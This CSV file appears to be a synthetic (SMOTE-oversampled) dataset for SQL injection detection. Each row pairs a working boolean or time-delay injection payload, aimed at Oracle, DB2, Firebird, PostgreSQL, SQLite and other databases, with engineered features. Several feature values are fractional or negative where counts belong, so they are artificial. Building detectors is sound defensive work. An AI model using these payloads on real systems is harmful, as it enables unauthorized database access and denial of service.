id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000146,attack,boolean,"1""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000295,0.11969571819063322,140.75890589857224,29.060273525356944,3.8213847968836925,71.0,8.0,44.75890589857223,17.0,0.5044322452348382,0.05683743608279868,0.3179507670064158,0.1207795516759472,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.939726474643057,0.060273525356943025,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,boolean,"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000179,0.3914919144151836,134.27837229063485,28.0,3.8610700391391255,62.0,10.0,41.02269783250789,21.255674458126972,0.4618470588417042,0.07449146110350068,0.3053766982727555,0.1582847817820396,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.255674458126971,1.0,5.0,4.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000148,attack,boolean,"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000037,0.6337445681615134,136.07860576216598,33.0,3.6494296891794193,36.0,16.0,57.66288460973277,26.415721152433193,0.2646392243402784,0.11761743304012373,0.42362421427160407,0.19411912834799383,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.415721152433193,0.0,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000149,attack,boolean,"1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000102,2.1667701898670906,136.25172889872096,31.937067775319765,4.161806380607976,75.0,9.531466112340118,35.59439833702035,16.12586444936047,0.5509264249240221,0.06990735750759777,0.2611418721823688,0.11802434538601131,0.5314661123401179,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.531466112340118,0.0,2.65733056170059,3.531466112340118,2.0,0.531466112340118,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000150,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,nearest_attack_euclidean,R000130,0.12638415436800696,137.0,28.33981650950932,3.3255653594004766,42.0,13.0,66.0,16.0,0.30656934306569344,0.0948905109489051,0.48175182481751827,0.11678832116788321,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,-2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000151,attack,boolean,"1%'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000039,0.05261110277771315,131.0,31.06345850036192,4.023245538914512,72.0,8.03172925018096,34.93654149963808,16.03172925018096,0.549618320610687,0.061310910306724885,0.26669115648578684,0.12237961259680122,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.968270749819039,1.0,0.0,2.0317292501809603,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""jwzy""  =  ""jwzy",nearest_attack_euclidean,R000225,0.10647056512311703,132.0,34.884610985730625,3.681898193346464,46.0,10.0,57.0,19.0,0.3484848484848485,0.07575757575757576,0.4318181818181818,0.14393939393939395,2.086541760702034,2.9134582392979658,0.0,1.0,0.0,1.0,0.0,11.0,0.0,0.0,1.0,2.0,1.0,0.9711527464326553,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000153,attack,boolean,"1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000210,0.6358129249057811,133.6527827020627,27.564811531958206,3.8480875423451755,62.0,10.0,40.87037693608359,20.782405765979103,0.4639278788407846,0.07482707723238462,0.3057081393419178,0.15553690458491287,0.7824057659791025,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.217594234020898,0.7824057659791025,5.0,4.0,4.0,0.7824057659791025,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,boolean,"1'   )    )    as jpxj where 6153  =  6153 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000142,1.7061092637356818,131.0,33.08047275644944,3.8072958687803253,43.839054487101116,21.0,49.78165464757305,16.37929086532584,0.3346492708939016,0.16030534351145037,0.38001263089750414,0.1250327546971438,1.3792908653258378,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,7.540236378224721,0.0,1.0,1.0,5.459763621775279,0.4597636217752792,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.459763621775279,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.459763621775279
SMOTE_000155,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  '%'  =  '",nearest_attack_euclidean,R000257,0.6441867297984724,140.60443980709158,35.0,3.941896287286603,53.41775922836628,10.0,51.79112038581686,25.39556019290843,0.37976156246527204,0.0711245272600143,0.3684467577584762,0.18066715251623738,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,10.697780096454215,0.6977800964542151,2.0,1.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,boolean,"1' where 5023  =  5023 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000212,0.17621611072678556,138.0,32.481597735156555,4.2508260323125455,70.0,16.0,37.0,15.0,0.5072463768115942,0.11594202898550725,0.26811594202898553,0.10869565217391304,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000157,attack,boolean,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",nearest_attack_euclidean,R000184,0.9337312718923622,136.98371283010277,30.60651486795889,3.5092920309017943,43.639089207753344,14.57394052816444,60.96742566020555,17.803257433979446,0.31913148425478344,0.10608404490191008,0.44475025202398266,0.13003421881932387,3.2130297359177797,-1.1102230246251565e-16,0.0,0.0,1.0,1.196742566020555,0.0,10.39348513204111,0.0,1.0,1.0,2.1967425660205553,0.8032574339794449,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000158,attack,boolean,"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000136,0.43266548133228877,140.1993350624436,28.199335062443602,3.788832142921456,71.0,8.0,45.0,16.199335062443602,0.5064258971918189,0.05706207292302184,0.32097416019199787,0.11553786969316143,0.19933506244360255,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,7.0,0.0,0.0,2.0,4.0,0.19933506244360283,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000159,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R000205,1.3306049666776005,134.9253822598621,31.407252074246315,3.551421381218198,43.443512445477886,13.0,59.592747925753685,18.889121888630527,0.32118294434682493,0.09640483046725394,0.4420892146264116,0.14032301055950952,0.0,3.999999999999999,0.0,0.0,1.0,1.296373962876843,0.0,10.0,0.5927479257536856,1.0,1.0,2.2963739628768427,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000160,attack,boolean,"1  )   where 9010  =  9010 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000177,0.03441861128896237,142.0,33.085258401899516,4.181951297516526,70.0,16.0,41.0,15.0,0.49295774647887325,0.11267605633802817,0.2887323943661972,0.1056338028169014,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000161,attack,boolean,"1  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000268,0.6621188168721883,135.91017584550883,31.0,4.209933330250142,74.90847094542352,9.0,36.45594037279709,15.545764527288242,0.5517392686793733,0.06625428270299674,0.2677119737063358,0.11429447491129416,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.545764527288242,0.0,0.0,3.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,boolean,"1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000158,0.3740687817631661,133.0,30.653637062695253,4.123476105280905,69.78772971943339,8.826818531347627,38.38545174921899,16.0,0.5247197723265669,0.06636705662667389,0.28861241916706004,0.12030075187969924,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.346362937304747,0.0,0.0,2.8268185313476266,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",nearest_attack_euclidean,R000096,0.14262667772150295,137.13879088701626,32.90747274198917,4.269208141332513,79.04626362900541,7.814945483978339,35.18505451602166,15.09252725801083,0.5764011281073753,0.05701445277418678,0.2565430024843274,0.11004141663411054,0.0,3.9537363709945836,0.0,0.0,1.0,1.0,0.0,4.046263629005415,0.0,0.0,2.046263629005415,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.9537363709945847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.953736370994585
SMOTE_000164,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000300,0.1230642293264619,136.16860238259807,36.0,3.8096457598841478,42.0,23.0,54.0,17.168602382598078,0.30844346822299706,0.16890951831259363,0.3965701734295676,0.12607684003484174,2.1686023825980785,-1.1102230246251565e-16,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,boolean,"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000127,0.7126202164516824,141.0,32.0,4.125424754165633,68.0,18.0,36.0,19.0,0.48226950354609927,0.1276595744680851,0.2553191489361702,0.1347517730496454,0.2338721057060298,0.7661278942939701,2.0,0.0,1.0,2.0,0.0,4.0,0.0,5.0,4.0,5.0,0.23387210570602973,0.7661278942939702,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000166,attack,boolean,"1%'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000053,2.015615876496892,141.0,33.490781782538384,3.4122666819675014,34.0,15.0,68.0,24.0,0.24113475177304963,0.10638297872340426,0.48226950354609927,0.1702127659574468,4.036872869846466,1.963127130153534,0.0,1.0,0.0,2.0,0.0,12.0,2.0,0.0,1.0,3.0,1.0,0.4907817825383836,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,boolean,"1"" where 5372  =  5372 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000103,0.07329353081214661,138.0,33.19512857075005,4.274671275641323,70.0,16.0,37.0,15.0,0.5072463768115942,0.11594202898550725,0.26811594202898553,0.10869565217391304,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000168,attack,boolean,"1%""  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000302,0.15234196270366326,136.0,32.85891967297962,4.222884624819916,71.50621885542867,8.929459836489809,37.564321308081524,18.0,0.525781020995799,0.06565779291536625,0.2762082449123641,0.1323529411764706,0.0,1.0,2.0,0.0,1.0,1.0,0.0,5.14108032702038,1.0,0.0,2.92945983648981,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""tjbe"" like ""tjbe",nearest_attack_euclidean,R000024,0.17486194550701176,138.15920172646153,35.15920172646153,4.33643830533998,67.94693275784616,15.159201726461529,37.0,18.053067242153844,0.4918208964530469,0.10970201523048453,0.2678132149306673,0.13066387338580135,4.0,3.999999999999999,0.05306724215384284,0.0,0.0,1.0,0.0,4.0,0.0,0.0,-2.220446049250313e-16,5.053067242153843,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.946932757846157,0.0530672421538429,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000170,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000004,1.1483356283908142,141.0,31.49683766848553,3.922755617529976,47.0,16.0,52.0,26.0,0.3333333333333333,0.11347517730496454,0.36879432624113473,0.18439716312056736,3.0063246630289404,0.9936753369710589,0.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,8.0,0.7515811657572352,0.2484188342427649,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,boolean,"1  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000268,0.21148325734123669,134.0,31.0,4.199587024204448,73.0092683191613,9.0,36.24304876062903,15.747682920209677,0.5448452859638903,0.06716417910447761,0.2704705131390226,0.11752002179260952,0.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.747682920209677,0.0,0.0,3.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000172,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000026,0.7888105668374694,132.42824427002245,31.214122135011223,3.590693242901203,45.35763359496633,11.070610675056118,56.78587786498878,19.214122135011223,0.3425773630774832,0.08350509760330073,0.4288402281087313,0.1450773112104848,5.214122135011224,-1.1102230246251565e-16,0.0,1.0,0.0,1.2141221350112237,0.0,10.785877864988777,0.0,0.0,1.0,2.2141221350112237,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7858778649887762,0.0,2.7755575615628914e-17,0.0,1.214122135011224,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,boolean,"1'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000215,0.4146617205487011,133.16856404668098,32.207858988329754,4.226442430969346,71.0,9.0,36.16856404668099,17.0,0.533239492117431,0.06759373843742084,0.27148970795224203,0.12767706149290603,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.792141011670248,0.2078589883297527,0.0,3.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000174,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000234,0.012273936213002767,133.99346336231292,33.00653663768706,3.696724565386962,43.0098049565306,14.983658405782336,56.00326831884353,19.99673168115647,0.3209856931024222,0.11182204183288891,0.4179559026704833,0.14923636239420554,2.0,3.996731681156467,0.0,1.0,0.0,1.996731681156467,0.0,10.003268318843531,0.0,0.0,1.0,2.996731681156467,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.003268318843532847,0.0,2.7755575615628914e-17,0.0,1.996731681156467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,boolean,"1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000173,0.6698448797594477,140.6744200172275,30.6744200172275,4.066789373715639,69.36047006029625,8.33721000861375,42.9767399483175,20.0,0.4929215124389956,0.059246179128174294,0.3056536565386928,0.1421786518941373,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,5.325579982772499,2.0,0.0,2.3372100086137504,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
